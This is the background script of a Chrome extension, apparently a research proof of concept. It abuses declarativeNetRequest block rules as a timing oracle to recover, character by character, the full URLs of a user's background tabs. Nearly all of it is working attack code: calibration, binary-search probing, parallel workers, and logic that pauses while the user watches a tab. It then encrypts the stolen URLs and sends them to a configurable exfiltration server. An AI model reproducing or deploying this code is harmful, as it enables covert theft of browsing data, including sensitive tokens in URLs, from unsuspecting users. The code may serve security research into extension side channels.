const TIMEOUT_MS  = 5000;
const MAX_LEN     = 128;

const escRe = s => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
const escCC = c => c.replace(/[-\\\]^]/g, "\\$&");
const cls   = a => `[${a.map(escCC).join("")}]`;

const ALPHABET =
  "abcdefghijklmnopqrstuvwxyz" +
  "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
  "0123456789:/?&=.-_%#@!~+,;";

const SORTED  = [...ALPHABET].sort();
const SCHEMES = ["https://", "http://"];

let leaking = false;
let blockThreshold = 30;
let currentLeakTabId = null;     // sequential mode: tab currently being leaked
let abortLeak = false;           // sequential mode: abort flag
let currentLeakScheme = null;    // sequential mode: scheme resolved so far
let currentLeakPrefix = "";      // sequential mode: chars resolved so far
let globalPaused = false;
let calibrating = false;         // true during shared calibration phase

// ── Batch mode ──
let batchMode       = false;     // true → leak up to BATCH_SIZE tabs simultaneously
const BATCH_SIZE    = 3;         // max parallel workers
let sharedCalibrated = false;    // skip re-calibration for subsequent batch workers
// tabId → { ruleId, abortRef:{v:false}, scheme, prefix, calibrating }
const activeWorkers = new Map();

// Publish current leak state to storage so the popup can read it
const publishStatus = () => {
    const workers = [...activeWorkers.entries()].map(([tid, w]) => ({
        tabId:       tid,
        prefix:      (w.scheme || "") + (w.prefix || ""),
        charPos:     (w.prefix || "").length,
        calibrating: !!w.calibrating
    }));
    const first = workers[0] || null;
    chrome.storage.local.set({
        leakStatus: {
            paused:      globalPaused,
            calibrating: first ? first.calibrating : calibrating,
            tabId:       first ? first.tabId : currentLeakTabId,
            prefix:      first ? first.prefix
                               : (currentLeakScheme ? currentLeakScheme + currentLeakPrefix : currentLeakPrefix),
            charPos:     first ? first.charPos : currentLeakPrefix.length,
            maxLen:      MAX_LEN,
            queueLen:    queue.length + waitingForBackground.size,
            batchMode,
            workers,
            ts:          Date.now()
        }
    });
};

// ─── DNR rule management ───

const setBlock = async (regex) => {
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: rules.map(r => r.id),
        addRules: [{
            id: 1,
            priority: 1,
            action: { type: "block" },
            condition: {
                regexFilter: regex,
                isUrlFilterCaseSensitive: true,
                resourceTypes: ["main_frame"]
            }
        }]
    });
};

const clearRules = async () => {
    const rules = await chrome.declarativeNetRequest.getDynamicRules();
    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: rules.map(r => r.id)
    });
};

// Per-worker rule helpers (batch mode) — each worker owns one rule ID
const setBlockForRule = async (regex, ruleId) => {
    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: [ruleId],
        addRules: [{ id: ruleId, priority: 1,
            action: { type: "block" },
            condition: { regexFilter: regex, isUrlFilterCaseSensitive: true,
                         resourceTypes: ["main_frame"] }
        }]
    });
};

const clearRule = async (ruleId) => {
    await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [ruleId] });
};

// ─── Timing oracle ───
// Uses per-probe temporary listeners. Waits for "loading" BEFORE accepting
// "complete" so stale completion events from error pages are ignored.

// abortRef is optional { v: false }; if null falls back to the global abortLeak flag
const reloadTab = (tabId, abortRef = null) => {
    return new Promise(resolve => {
        const isAborted = () => abortRef ? abortRef.v : abortLeak;
        if (isAborted()) { resolve(null); return; }
        let sawLoading = false;

        const listener = (tid, info) => {
            if (tid !== tabId) return;
            if (info.status === "loading") sawLoading = true;
            if (info.status === "complete" && sawLoading) {
                chrome.tabs.onUpdated.removeListener(listener);
                clearTimeout(timer);
                resolve(performance.now() - start);
            }
        };

        const start = performance.now();
        const timer = setTimeout(() => {
            chrome.tabs.onUpdated.removeListener(listener);
            resolve(isAborted() ? null : TIMEOUT_MS);
        }, TIMEOUT_MS);

        chrome.tabs.onUpdated.addListener(listener);
        chrome.tabs.reload(tabId, { bypassCache: true });
    });
};

// ─── Calibration ───
// Measures actual blocked vs. unblocked round-trip times and sets the
// threshold dynamically so it works on LAN, WAN, and everything in between.

const calibrate = async (tabId) => {
    calibrating = true;
    publishStatus();
    console.log("[*] Calibrating timing oracle...");

    // Warm up — first reload is often an outlier
    await clearRules();
    await reloadTab(tabId);

    // Blocked samples (rule matches everything)
    await setBlock("https://.*|http://.*");
    const b = [];
    for (let i = 0; i < 5; i++) {
        if (abortLeak) return;
        b.push(await reloadTab(tabId));
    }
    b.sort((a, c) => a - c);
    const blocked = b[Math.floor(b.length / 2)]; // median

    // Unblocked samples (no rules active)
    await clearRules();
    await reloadTab(tabId); // warm-up after rule change
    const u = [];
    for (let i = 0; i < 5; i++) {
        if (abortLeak) return;
        u.push(await reloadTab(tabId));
    }
    u.sort((a, c) => a - c);
    const unblocked = u[Math.floor(u.length / 2)]; // median

    // Sanity check — blocked must be significantly faster than unblocked
    if (blocked >= unblocked * 0.8) {
        // Can't distinguish — use a safe fallback
        blockThreshold = 40;
        console.warn(
            `[!] Calibration ambiguous: blocked=${Math.round(blocked)}ms,`,
            `unblocked=${Math.round(unblocked)}ms — using fallback threshold=${blockThreshold}ms`
        );
        calibrating = false;
        publishStatus();
    } else {
        blockThreshold = blocked + (unblocked - blocked) * 0.3;
        console.log(
            `[*] Calibration done: blocked=${Math.round(blocked)}ms,`,
            `unblocked=${Math.round(unblocked)}ms,`,
            `threshold=${Math.round(blockThreshold)}ms`
        );
    }
    calibrating = false;
    publishStatus();
};

const AMBIG_FACTOR = 0.4;  // ambiguous band: threshold × [1-f … 1+f]
const MAX_VOTES    = 3;

// Shared probe logic used by both sequential and batch workers
const _probe = async (tabId, abortRef) => {
    const isAborted = () => abortRef ? abortRef.v : abortLeak;
    const lo = blockThreshold * (1 - AMBIG_FACTOR);
    const hi = blockThreshold * (1 + AMBIG_FACTOR);
    let blocks = 0, votes = 0;
    for (let i = 0; i < MAX_VOTES; i++) {
        if (isAborted()) return false;
        const t = await reloadTab(tabId, abortRef);
        if (t === null) return false;
        votes++;
        const hit = t < blockThreshold;
        console.log(`[t${votes}] ${Math.round(t)}ms ${hit ? "BLOCK" : "ALLOW"}`);
        if (hit) blocks++;
        if (t < lo) return true;   // unambiguously blocked
        if (t > hi) return false;  // unambiguously allowed
        if (blocks > MAX_VOTES / 2) return true;
        if ((MAX_VOTES - i - 1 + blocks) <= MAX_VOTES / 2) return false;
    }
    return blocks > MAX_VOTES / 2;
};

// Sequential mode — uses global rule slot (id=1) and global abortLeak
const blockedBy = async (regex, tabId) => {
    if (abortLeak) return false;
    await setBlock(regex);
    return _probe(tabId, null);
};

// Batch worker mode — each worker owns its own rule ID and abort ref
const blockedByW = async (regex, tabId, ruleId, abortRef) => {
    if (abortRef.v) return false;
    await setBlockForRule(regex, ruleId);
    return _probe(tabId, abortRef);
};

// ─── Leak logic ───

const detectScheme = async (tabId) => {
    for (const scheme of SCHEMES) {
        if (await blockedBy(scheme + ".*", tabId)) {
            console.log("[*] Detected scheme:", scheme);
            return scheme;
        }
    }
    return null;
};

const leakChar = async (scheme, prefix, tabId) => {
    let set = SORTED.slice();
    while (set.length > 1) {
        if (abortLeak) return null;
        const mid  = set.length >> 1;
        const left = set.slice(0, mid);
        const re = scheme + escRe(prefix) + cls(left) + ".*";
        set = await blockedBy(re, tabId) ? left : set.slice(mid);
    }
    const c = set[0];
    if (!c) return null;
    // Verify the converged character actually blocks — if not, we're past the URL end
    const verified = await blockedBy(scheme + escRe(prefix + c) + ".*", tabId);
    return verified ? c : null;
};

const leak = async (tabId) => {
    let scheme, out, calibrated;

    // Resume from saved progress if available
    if (partialProgress.has(tabId)) {
        const saved = partialProgress.get(tabId);
        scheme     = saved.scheme;
        out        = saved.prefix;
        calibrated = saved.calibrated;
        console.log(`[*] Resuming tab ${tabId} from: ${scheme}${out}`);
        partialProgress.delete(tabId);
    } else {
        scheme     = null;
        out        = "";
        calibrated = false;
    }

    // Calibrate if we haven't yet for this tab
    if (!calibrated) {
        await calibrate(tabId);
        if (abortLeak) {
            partialProgress.set(tabId, { scheme, prefix: out, calibrated: false });
            return "";
        }
    }

    // Detect scheme if we don't have one yet
    if (!scheme) {
        scheme = await detectScheme(tabId);
        if (abortLeak) {
            if (!closingTabs.has(tabId))
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
            return "";
        }
        if (!scheme) {
            console.log("[-] Could not detect scheme (chrome:// / file:// / about:).");
            return "";
        }
    }

    let sameCount = 0, prev = out.length > 0 ? out[out.length - 1] : null;
    currentLeakScheme = scheme;
    currentLeakPrefix = out;
    for (let i = out.length; i < MAX_LEN; i++) {
        if (abortLeak) {
            // Save progress for later resume (unless the tab was closed)
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        const c = await leakChar(scheme, out, tabId);
        if (abortLeak) {
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        if (!c) break;
        sameCount = (c === prev) ? sameCount + 1 : 0;
        if (sameCount >= 3) break;
        out += c;
        currentLeakPrefix = out;
        publishStatus();
        prev = c;
        console.log("[+]", scheme + out);
    }
    await clearRules();
    currentLeakScheme = null;
    currentLeakPrefix = "";
    return abortLeak ? "" : scheme + out;
};

// ── Batch worker functions ──

// Worker-scoped calibration. Uses its own ruleId. Writes to shared blockThreshold.
const calibrateW = async (tabId, ruleId, abortRef) => {
    const w = activeWorkers.get(tabId);
    if (w) { w.calibrating = true; publishStatus(); }
    console.log(`[*] [Tab ${tabId}] Calibrating...`);
    await clearRule(ruleId);
    await reloadTab(tabId, abortRef);

    await setBlockForRule("https://.*|http://.*", ruleId);
    const b = [];
    for (let i = 0; i < 5; i++) {
        if (abortRef.v) { if (w) { w.calibrating = false; } return; }
        b.push(await reloadTab(tabId, abortRef));
    }
    b.sort((a, c) => a - c);
    const blocked = b[Math.floor(b.length / 2)];

    await clearRule(ruleId);
    await reloadTab(tabId, abortRef);
    const u = [];
    for (let i = 0; i < 5; i++) {
        if (abortRef.v) { if (w) { w.calibrating = false; } return; }
        u.push(await reloadTab(tabId, abortRef));
    }
    u.sort((a, c) => a - c);
    const unblocked = u[Math.floor(u.length / 2)];

    if (blocked >= unblocked * 0.8) {
        blockThreshold = 40;
        console.warn(`[!] Tab ${tabId} calibration ambiguous — fallback ${blockThreshold}ms`);
    } else {
        blockThreshold = blocked + (unblocked - blocked) * 0.3;
        console.log(`[*] Tab ${tabId} calibration done: blocked=${Math.round(blocked)}ms unblocked=${Math.round(unblocked)}ms threshold=${Math.round(blockThreshold)}ms`);
    }
    if (w) { w.calibrating = false; publishStatus(); }
};

const detectSchemeW = async (tabId, ruleId, abortRef) => {
    for (const scheme of SCHEMES) {
        if (await blockedByW(scheme + ".*", tabId, ruleId, abortRef)) {
            console.log(`[*] [Tab ${tabId}] Detected scheme: ${scheme}`);
            return scheme;
        }
    }
    return null;
};

const leakCharW = async (scheme, prefix, tabId, ruleId, abortRef) => {
    let set = SORTED.slice();
    while (set.length > 1) {
        if (abortRef.v) return null;
        const mid  = set.length >> 1;
        const left = set.slice(0, mid);
        const re   = scheme + escRe(prefix) + cls(left) + ".*";
        set = await blockedByW(re, tabId, ruleId, abortRef) ? left : set.slice(mid);
    }
    const c = set[0];
    if (!c) return null;
    const verified = await blockedByW(scheme + escRe(prefix + c) + ".*", tabId, ruleId, abortRef);
    return verified ? c : null;
};

const leakW = async (tabId, ruleId, abortRef) => {
    let scheme, out, calibrated;

    if (partialProgress.has(tabId)) {
        const saved = partialProgress.get(tabId);
        scheme    = saved.scheme;
        out       = saved.prefix;
        calibrated = saved.calibrated;
        console.log(`[*] Resuming tab ${tabId} from: ${scheme}${out}`);
        partialProgress.delete(tabId);
    } else {
        scheme = null; out = ""; calibrated = false;
    }

    if (!calibrated) {
        if (sharedCalibrated) {
            console.log(`[*] [Tab ${tabId}] Reusing shared calibration (threshold=${Math.round(blockThreshold)}ms)`);
        } else {
            sharedCalibrated = true; // claim the slot so other workers skip
            await calibrateW(tabId, ruleId, abortRef);
            if (abortRef.v) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: false });
                return "";
            }
        }
    }

    if (!scheme) {
        scheme = await detectSchemeW(tabId, ruleId, abortRef);
        if (abortRef.v) {
            if (!closingTabs.has(tabId)) partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
            return "";
        }
        if (!scheme) { console.log(`[-] [Tab ${tabId}] Could not detect scheme.`); return ""; }
    }

    const w = activeWorkers.get(tabId);
    if (w) { w.scheme = scheme; w.prefix = out; }
    let sameCount = 0, prev = out.length > 0 ? out[out.length - 1] : null;

    for (let i = out.length; i < MAX_LEN; i++) {
        if (abortRef.v) {
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        const c = await leakCharW(scheme, out, tabId, ruleId, abortRef);
        if (abortRef.v) {
            if (!closingTabs.has(tabId)) {
                partialProgress.set(tabId, { scheme, prefix: out, calibrated: true });
                console.log(`[!] Paused tab ${tabId} at: ${scheme}${out}`);
            }
            break;
        }
        if (!c) break;
        sameCount = (c === prev) ? sameCount + 1 : 0;
        if (sameCount >= 3) break;
        out += c;
        if (w) { w.prefix = out; }
        publishStatus();
        prev = c;
        console.log(`[+] [Tab ${tabId}]`, scheme + out);
    }
    await clearRule(ruleId);
    return abortRef.v ? "" : scheme + out;
};

// Assign batch rule IDs starting at 10 to avoid colliding with sequential rule ID 1
const nextBatchRuleId = () => {
    const used = new Set([...activeWorkers.values()].map(w => w.ruleId));
    for (let id = 10; id < 10 + BATCH_SIZE + 1; id++) if (!used.has(id)) return id;
    return 10;
};

const leakTabParallel = async (tabId) => {
    const ruleId   = nextBatchRuleId();
    const abortRef = { v: false };
    activeWorkers.set(tabId, { ruleId, abortRef, scheme: null, prefix: "", calibrating: false });
    publishStatus();

    let url = "";
    try {
        url = await leakW(tabId, ruleId, abortRef);
    } catch (e) {
        console.error(`[-] Batch leak error on tab ${tabId}:`, e);
    }

    activeWorkers.delete(tabId);
    publishStatus();

    if (abortRef.v || !url) return;

    leakedTabs.add(tabId);
    console.log(`[*] Tab ${tabId} leaked:`, url);
    const { leakedUrls = [] } = await chrome.storage.local.get("leakedUrls");
    leakedUrls.push({ tabId, url, ts: Date.now() });
    await chrome.storage.local.set({ leakedUrls });
    await exfiltrate([url]);
};

// --- Encryption (AES-GCM via Web Crypto API) ---
// Pre-shared key material — must match server
const PSK = "ch40s_r3s34rch_k3y_2026";

const deriveKey = async () => {
    const enc  = new TextEncoder();
    const base = await crypto.subtle.importKey(
        "raw", enc.encode(PSK), "PBKDF2", false, ["deriveKey"]
    );
    return crypto.subtle.deriveKey(
        { name: "PBKDF2", salt: enc.encode("dnr-salt"), iterations: 100000, hash: "SHA-256" },
        base,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt"]
    );
};

const encryptPayload = async (data) => {
    const key = await deriveKey();
    const iv  = crypto.getRandomValues(new Uint8Array(12));
    const enc = new TextEncoder();
    const ct  = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(data));
    const toB64 = buf => {
        let bin = "";
        const bytes = new Uint8Array(buf);
        for (let i = 0; i < bytes.byteLength; i++) bin += String.fromCharCode(bytes[i]);
        return btoa(bin);
    };
    return { iv: toB64(iv.buffer), ct: toB64(ct) };
};

// --- Exfiltration ---
const DEFAULT_EXFIL_URL = "http://localhost:3000";

const getExfilUrl = () => new Promise(resolve =>
    chrome.storage.local.get("exfilUrl", ({ exfilUrl }) =>
        resolve((exfilUrl || DEFAULT_EXFIL_URL).replace(/\/$/, ""))
    )
);

const exfiltrate = async (urls, partial = false) => {
    const serverUrl = await getExfilUrl();
    const payload = await encryptPayload(JSON.stringify({ urls, partial }));
    await fetch(`${serverUrl}/upload`, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ ...payload, ts: Date.now() })
    });
};

// --- Main ---

// Track which tabs have already been leaked so we don't repeat
const leakedTabs = new Set();

// Tabs that were closed while being actively leaked — don't save partial progress for these
const closingTabs = new Set();

// Listen for pause/resume and batchMode commands from the popup
chrome.storage.onChanged.addListener((changes, area) => {
    if (area !== "local") return;
    if ("batchMode" in changes) {
        batchMode = !!changes.batchMode.newValue;
        sharedCalibrated = false; // re-calibrate on next session start
        console.log(`[*] Batch mode ${batchMode ? "enabled" : "disabled"}`);
        publishStatus();
    }
    if (!("isPaused" in changes)) return;
    globalPaused = changes.isPaused.newValue;
    if (globalPaused) {
        // Abort sequential leak
        if (currentLeakTabId !== null) abortLeak = true;
        // Abort all batch workers
        for (const [, w] of activeWorkers) w.abortRef.v = true;
        console.log("[*] Leak engine paused by user");
        publishStatus();
    } else {
        sharedCalibrated = false; // fresh calibration on resume
        console.log("[*] Leak engine resumed by user");
        publishStatus();
        processQueue();
    }
});

// Partial progress saved when a leak is aborted mid-way
// Map<tabId, { scheme: string, prefix: string, calibrated: boolean }>
const partialProgress = new Map();

const leakTab = async (tabId) => {
    currentLeakTabId = tabId;
    if (!globalPaused) abortLeak = false; // only clear abort flag if not paused
    publishStatus();
    let url = "";
    try {
        url = await leak(tabId);
    } catch (e) {
        console.error("[-] Leak error on tab", tabId, e);
        url = "";
    }
    currentLeakTabId = null;
    publishStatus();

    if (abortLeak || !url) {
        // Aborted — tab became active. Don't mark as leaked.
        abortLeak = false;
        return;
    }

    leakedTabs.add(tabId);
    console.log(`[*] Tab ${tabId} leaked:`, url);

    // Append to stored list
    const { leakedUrls = [] } = await chrome.storage.local.get("leakedUrls");
    leakedUrls.push({ tabId, url, ts: Date.now() });
    await chrome.storage.local.set({ leakedUrls });

    // Exfiltrate immediately
    await exfiltrate([url]);
};

// Queue-based processing — leaks tabs one at a time
const queue = [];
let processing = false;

// Tabs that can't be leaked yet because they're active.
// Moved back to the queue when they go to background.
const waitingForBackground = new Set();

const enqueue = (tabId) => {
    if (leakedTabs.has(tabId)) return;      // already done
    if (queue.includes(tabId)) return;       // already queued
    if (waitingForBackground.has(tabId)) return; // already waiting
    queue.push(tabId);
    processQueue();
};

const processQueue = async () => {
    if (processing) return;
    if (globalPaused) return;
    processing = true;
    leaking = true;
    publishStatus();

    if (batchMode) {
        // Each slot independently dequeues and leaks tabs until queue is empty
        const slot = async () => {
            while (queue.length > 0 && !globalPaused) {
                const tabId = queue.shift();
                let tab;
                try { tab = await chrome.tabs.get(tabId); } catch { publishStatus(); continue; }
                if (tab.active) {
                    console.log(`[*] Tab ${tabId} is active, deferring (batch)`);
                    waitingForBackground.add(tabId);
                    publishStatus();
                    continue;
                }
                console.log(`[*] [Batch] Starting tab ${tabId} (${queue.length} remaining)`);
                await leakTabParallel(tabId);
            }
        };
        await Promise.all(Array.from({ length: BATCH_SIZE }, slot));
    } else {
        // Sequential mode
        while (queue.length > 0) {
            if (globalPaused) break;
            const tabId = queue.shift();
            let tab;
            try { tab = await chrome.tabs.get(tabId); } catch { publishStatus(); continue; }
            if (tab.active) {
                console.log(`[*] Tab ${tabId} is active, deferring until it goes to background`);
                waitingForBackground.add(tabId);
                publishStatus();
                continue;
            }
            console.log(`[*] Leaking background tab ${tabId} (${queue.length} remaining in queue)...`);
            await leakTab(tabId);
            if (globalPaused) break;
        }
    }

    leaking = false;
    processing = false;
    publishStatus();
};

// On user navigation / new tab load, queue for leaking
chrome.tabs.onUpdated.addListener(async (tabId, info) => {
    if (info.status === "complete") {
        if (tabId === currentLeakTabId) return;    // sequential: oracle reload
        if (activeWorkers.has(tabId)) return;      // batch: oracle reload
        if (leakedTabs.has(tabId)) return;         // already done
        let tab;
        try { tab = await chrome.tabs.get(tabId); } catch { return; }
        if (tab.active) {
            // Tab is active — park it so it's queued when the user switches away
            if (!waitingForBackground.has(tabId) && !queue.includes(tabId)) {
                console.log(`[*] New/navigated active tab ${tabId} — will queue when backgrounded`);
                waitingForBackground.add(tabId);
                publishStatus();
            }
            return;
        }
        leakedTabs.delete(tabId); // URL may have changed
        console.log("[*] Background navigation detected on tab", tabId);
        enqueue(tabId);
    }
});

// When a tab is closed, clean up
chrome.tabs.onRemoved.addListener(async (tabId) => {
    // Sequential mode: tab actively being leaked
    if (currentLeakTabId === tabId && currentLeakPrefix) {
        const partial = (currentLeakScheme || "") + currentLeakPrefix;
        console.log(`[!] Tab ${tabId} closed mid-leak — exfiltrating partial: ${partial}`);
        closingTabs.add(tabId);
        abortLeak = true;
        await exfiltrate([partial], true);
    }
    // Batch mode: tab being leaked by a parallel worker
    else if (activeWorkers.has(tabId)) {
        const w = activeWorkers.get(tabId);
        const partial = (w.scheme || "") + (w.prefix || "");
        closingTabs.add(tabId);
        w.abortRef.v = true;
        if (partial) {
            console.log(`[!] Tab ${tabId} closed mid-batch-leak — exfiltrating partial: ${partial}`);
            await exfiltrate([partial], true);
        }
    } else if (partialProgress.has(tabId)) {
        // Tab closed while paused — exfil the saved partial progress
        const p = partialProgress.get(tabId);
        const partial = (p.scheme || "") + (p.prefix || "");
        if (partial) {
            console.log(`[!] Tab ${tabId} closed with saved partial — exfiltrating: ${partial}`);
            await exfiltrate([partial], true);
        }
    }
    leakedTabs.delete(tabId);
    partialProgress.delete(tabId);
    waitingForBackground.delete(tabId);
    closingTabs.delete(tabId);
    // Remove from queue if waiting to be leaked
    const qi = queue.indexOf(tabId);
    if (qi !== -1) queue.splice(qi, 1);
    publishStatus();
});

// When a tab becomes active, abort if we're leaking it.
// Also re-enqueue any tabs that were waiting to go to background.
chrome.tabs.onActivated.addListener(({ tabId }) => {
    // Sequential: abort if this is the tab being analyzed
    if (currentLeakTabId === tabId) {
        console.log(`[!] Tab ${tabId} became active — pausing sequential leak`);
        abortLeak = true;
        waitingForBackground.add(tabId);
    }
    // Batch: abort the specific worker for this tab
    if (activeWorkers.has(tabId)) {
        const w = activeWorkers.get(tabId);
        console.log(`[!] Tab ${tabId} became active — aborting batch worker, will resume when backgrounded`);
        w.abortRef.v = true;
        waitingForBackground.add(tabId);
    }

    // The previously-active tab(s) are now in background — release deferred tabs
    // (excluding the just-activated tab itself)
    for (const deferredId of waitingForBackground) {
        if (deferredId !== tabId) {
            console.log(`[*] Tab ${deferredId} is now in background — re-enqueueing`);
            waitingForBackground.delete(deferredId);
            enqueue(deferredId);
        }
    }
    publishStatus();
});

// On startup, restore paused state then queue background tabs (default: paused)
chrome.storage.local.get("isPaused", ({ isPaused }) => {
    globalPaused = isPaused !== false; // default to true if never set
    if (isPaused === undefined) chrome.storage.local.set({ isPaused: true });
    chrome.tabs.query({}).then(tabs => {
        const bgTabs = tabs.filter(t => !t.active);
        console.log(`[*] Found ${bgTabs.length} background tab(s), queueing... (paused=${globalPaused})`);
        for (const tab of bgTabs) enqueue(tab.id);
        publishStatus();
    });
});